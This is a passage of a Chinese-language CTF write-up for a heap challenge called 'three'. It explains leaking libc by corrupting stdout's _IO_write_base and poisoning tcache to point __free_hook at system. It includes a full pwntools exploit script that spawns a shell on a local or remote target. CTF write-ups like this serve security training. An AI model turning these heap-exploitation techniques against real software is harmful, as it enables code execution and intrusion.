fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"><span class="number">448</span>	  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line"><span class="number">449</span>	    &#123;</span><br><span class="line"><span class="number">450</span>	      <span class="keyword">off64_t</span> new_pos</span><br><span class="line"><span class="number">451</span>	        = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line"><span class="number">452</span>	      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="number">453</span>	        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">454</span>	      fp-&gt;_offset = new_pos;</span><br><span class="line"><span class="number">455</span>	    &#125;</span><br><span class="line">  	  <span class="comment">//调用_IO_SYSWRITE</span></span><br><span class="line"><span class="number">456</span>	  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line"><span class="number">457</span>	  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line"><span class="number">458</span>	    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line"><span class="number">459</span>	  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"><span class="number">460</span>	  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="number">461</span>	  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line"><span class="number">462</span>	                       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line"><span class="number">463</span>	                       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line"><span class="number">464</span>	  <span class="keyword">return</span> count;</span><br><span class="line"><span class="number">465</span>	&#125;</span><br></pre></td></tr></table></figure>
+<p>总结一下，也就是正常使用时，<code>_IO_write_ptr</code>和<code>_IO_write_base</code>的值是相等的，调用<code>_IO_OVERFLOW</code>也不会输出内容，接着执行<code>_IO_SYSWRITE</code>输出data，也就是puts的参数。</p>
+<p>但是如果我们能够修改<code>_IO_write_base</code>中的值，使它指向想要泄露的地址，那么在<code>_IO_OVERFLOW</code>中就能输出内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>
+<p><code>_IO_do_write</code>也是通过<code>new_do_write</code>实现的。为了通过该方法进行泄露，对一些值进行设置，绕过<code>new_do_write</code>里一些不需要的流程。</p>
+<p>参考了<a href="https://vigneshsrao.github.io/babytcache/" target="_blank" rel="noopener">vigneshsrao</a> 的思路，观察<code>_IO_new_file_overflow</code>和<code>new_do_write</code>：</p>
+<ol>
+<li><p>绕过<code>_IO_new_file_overflow</code>中的 <code>if (f-&gt;_flags &amp; _IO_NO_WRITES</code>)</p>
+<p>防止在执行 <code>_IO_do_write</code>之前返回，其中<code>_IO_NO_WRITES</code>为0x8</p>
+</li>
+<li><p>绕过<code>_IO_new_file_overflow</code>中的<code>if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</code></p>
+<p>防止对我们设置好的指针进行重新赋值，使<code>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)</code>==1，<code>_IO_CURRENTLY_PUTTING</code>为0x800</p>
+</li>
+<li><p>绕过<code>new_do_write</code> 中的 <code>else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</code></p>
+<p>防止在执行<code>_IO_SYSWRITE</code>之前return。<a href="https://vigneshsrao.github.io/babytcache/" target="_blank" rel="noopener">vigneshsrao</a>中给出的方法是，干脆不走这个else if，直接走上面的<code>if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</code>，其中<code>_IO_IS_APPENDING</code>=0x1000。</p>
+</li>
+</ol>
+<p>综上，flag的值可以设置为0xfbad1800。由于我们要修改<code>_IO_write_base</code>的值，就把flag到<code>_IO_write_base</code>之间的<code>_IO_read_XXX</code>设置为0。然后修改<code>_IO_write_base</code>为想要泄露的地址。这里我修改的是让_IO_write_base指向自己所在的地址，即stdout+0x20，这样就能输出stdout+0x20中的内容，进而泄露libc地址。</p>
+<h3 id="覆写free-hook为system"><a href="#覆写free-hook为system" class="headerlink" title="覆写free_hook为system"></a>覆写free_hook为system</h3><p>修改一个位于tcache中的block的FD指针，指向free_hook。此时tcache0x50-&gt;堆-&gt;free_hook，而且由于指向stdout的note如果释放会出错（因为size位对应stderr中的值，非常大，释放时要通过size寻找inuse位）所以notes只剩1个，直接分配肯定不能分到free_hook。因此先把堆上的块分配出去，修改它的size为0x61，此时再释放这个块，它就会进入到tcache 0x60中，这样剩余的note正好分到free_hook。</p>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">import</span> random,struct</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p = process(<span class="string">'./three'</span>)<span class="comment">#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span></span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">'39.96.13.122'</span>,<span class="number">9999</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendafter(<span class="string">"Input the content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Input the idx:"</span>,str(idx))</span><br><span class="line">	p.sendafter(<span class="string">"Input the content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx,c)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Input the idx:"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Clear?(y/n):"</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(p1)</span>:</span></span><br><span class="line">	f = open(<span class="string">'/proc/'</span>+str(pidof(p1)[<span class="number">0</span>])+<span class="string">'/maps'</span>,<span class="string">'r'</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">		tmp = f.readline()</span><br><span class="line">		<span class="keyword">print</span> tmp</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'libc-2.26.so'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">			libc_addr = int(<span class="string">'0x'</span>+tmp.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)					</span><br><span class="line">			f.close()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'[+] libc_addr :'</span>,hex(libc_addr)</span><br><span class="line">	<span class="keyword">return</span> libc_addr</span><br><span class="line"><span class="comment">#for unsortedbin check inuse</span></span><br><span class="line">add(<span class="string">'0'</span>*<span class="number">0x3f</span>+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="string">'0'</span>*<span class="number">0x3f</span>+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="string">'1'</span>*<span class="number">8</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">dele(<span class="number">2</span>,<span class="string">'y'</span>)</span><br><span class="line">dele(<span class="number">1</span>,<span class="string">'y'</span>)</span><br><span class="line">dele(<span class="number">0</span>,<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">add(p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+<span class="string">'\n'</span>)<span class="comment">#0 260;make 280'size = 0x91;270's size = 0x51</span></span><br><span class="line">add(<span class="string">'0gur1\n'</span>)<span class="comment">#1 2b0</span></span><br><span class="line">dele(<span class="number">1</span>,<span class="string">'y'</span>)<span class="comment">#tcache 0x50-&gt;2b0</span></span><br><span class="line">dele(<span class="number">0</span>,<span class="string">'n'</span>)<span class="comment">#tcache 0x50-&gt;260-&gt;2b0</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x80'</span>)<span class="comment">#tcache 0x50-&gt;260-&gt;280</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">'1gur1\n'</span>)<span class="comment">#1-&gt;0 260</span></span><br><span class="line">add(<span class="string">'2gur1\n'</span>)<span class="comment">#2-&gt;0+0x20 280</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>,<span class="string">'n'</span>)</span><br><span class="line">dele(<span class="number">2</span>,<span class="string">'n'</span>)</span><br><span class="line">dele(<span class="number">2</span>,<span class="string">'n'</span>)</span><br><span class="line">dele(<span class="number">2</span>,<span class="string">'n'</span>)</span><br><span class="line">dele(<span class="number">2</span>,<span class="string">'n'</span>)</span><br><span class="line">dele(<span class="number">2</span>,<span class="string">'n'</span>)</span><br><span class="line">dele(<span class="number">2</span>,<span class="string">'n'</span>)<span class="comment">#tcache 0x90 full with 280</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>))<span class="comment">#change 280's size to 0x51</span></span><br><span class="line">dele(<span class="number">1</span>,<span class="string">'y'</span>)<span class="comment">#tcache 0x50-&gt;260</span></span><br><span class="line">dele(<span class="number">2</span>,<span class="string">'n'</span>)<span class="comment">#tcache 0x50-&gt;280-&gt;260</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>))<span class="comment">#change 280's size to 0x91</span></span><br><span class="line">dele(<span class="number">2</span>,<span class="string">'y'</span>)<span class="comment">#put 280 in unsortedbin;tcache 0x50-&gt;280-&gt;main+88</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	libc_base = get_base(p)</span><br><span class="line">	stdout_addr = libc_base + libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line">	d = (stdout_addr)&amp;<span class="number">0xffff</span></span><br><span class="line">	c = struct.pack(<span class="string">'cc'</span>,chr(d&amp;<span class="number">0xff</span>),chr(d&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">	edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)+c)<span class="comment">#tcache 0x50-&gt;270-&gt;&amp;stdout</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)+<span class="string">'\x60\xf7'</span>)<span class="comment">#tcache 0x50-&gt;280-&gt;&amp;stdout</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">'1gur1\n'</span>)<span class="comment">#1-&gt;280</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	add(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x40'</span>)<span class="comment">#2-&gt;&amp;stdout,edit stdout's flag and pointer</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	add(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x80'</span>)<span class="comment">#2-&gt;&amp;stdout,edit stdout's flag and pointer</span></span><br><span class="line"><span class="comment">#puts leak libc address</span></span><br><span class="line">libc_addr = u64(p.recv(<span class="number">8</span>))<span class="number">-0x20</span>-libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">log.info(<span class="string">"libc_addr:%#x"</span>,libc_addr)</span><br><span class="line">free_hook = libc_addr +libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">sys_addr = libc_addr +libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>))<span class="comment">#change 280's size to 0x51</span></span><br><span class="line">dele(<span class="number">1</span>,<span class="string">'y'</span>)<span class="comment">#tcache 0x50-&gt;280</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>)+p64(free_hook))<span class="comment">#tcache 0x50-&gt;280-&gt;free_hook</span></span><br><span class="line">add(<span class="string">'1gur1\n'</span>)<span class="comment">#1-&gt;280</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'/bin/sh\0'</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x61</span>))<span class="comment">#change 280's size t0 0x61,not to put into tacache 0x50;tcache 0x50 -&gt;free_hook</span></span><br><span class="line">dele(<span class="number">1</span>,<span class="string">'y'</span>)<span class="comment">#tcache 0x60-&gt;280;tcache 0x50 -&gt;free_hook</span></span><br><span class="line">add(p64(sys_addr))<span class="comment">#write free_hook to system</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Input the idx:"</span>,str(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/12/scanf的IO利用/" rel="next" title="scanf的IO利用">
+                <i class="fa fa-chevron-left"></i> scanf的IO利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.jpg"
+                alt="0gur1" />
+            
+              <p class="site-author-name" itemprop="name">0gur1</p>
+              <p class="site-description motion-element" itemprop="description">Stay hungry.Stay foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#three"><span class="nav-number">1.</span> <span class="nav-text">three</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本逻辑"><span class="nav-number">1.1.</span> <span class="nav-text">基本逻辑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bug"><span class="nav-number">1.2.</span> <span class="nav-text">bug</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露地址"><span class="nav-number">1.3.1.</span> <span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#覆写free-hook为system"><span class="nav-number">1.3.2.</span> <span class="nav-text">覆写free_hook为system</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用脚本"><span class="nav-number">1.4.</span> <span class="nav-text">利用脚本</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0gur1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客量:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("KvkboNezCqOpWaIBvOMgJE3K-gzGzoHsz", "slQuYxW7tjbda9dyxmi3dY4o");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
